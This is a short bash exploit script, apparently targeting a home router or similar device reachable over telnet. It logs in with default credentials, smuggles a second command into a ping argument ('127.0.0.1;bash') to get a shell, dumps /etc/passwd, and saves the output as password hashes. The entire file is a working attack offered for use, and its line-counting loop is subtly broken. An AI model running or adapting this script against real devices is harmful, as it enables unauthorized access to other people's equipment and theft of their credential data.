#!/bin/bash

function main()
{
	logfile="hashes.log"
	hashfile="hashes.txt"

	if [ -z "$1" ]
	  then
	    host="192.168.1.1"
	  else
	  	host=$1
	fi

	echo "[+] Connecting to host $host"

	(expect -c "
		set timeout 20
		spawn telnet $host
		expect \"Login:\"
		send \"user\r\"
		expect \"Password:\"
		send \"user\r\"
		expect \">\"
		send \"ping -c 1 127.0.0.1;bash\n\"
		expect \"#\"
		send \"cat /etc/passwd\n\"
		expect \"#\"
		exit
	") > $logfile
	echo "[+] Saved session in $logfile"

	parse
}

function parse()
{
	echo "[+] Parsing hashes"
	cat $logfile | while read line; do
		if [[ $i -eq 20 ]]; then
			echo $line > $hashfile
		else
			if [[ $i -gt 20 ]]; then
				echo $line >> $hashfile
			fi
		fi
		i=$i+1
	done
	echo "[+] Hashes saved in $hashfile !"
}
main $1
exit

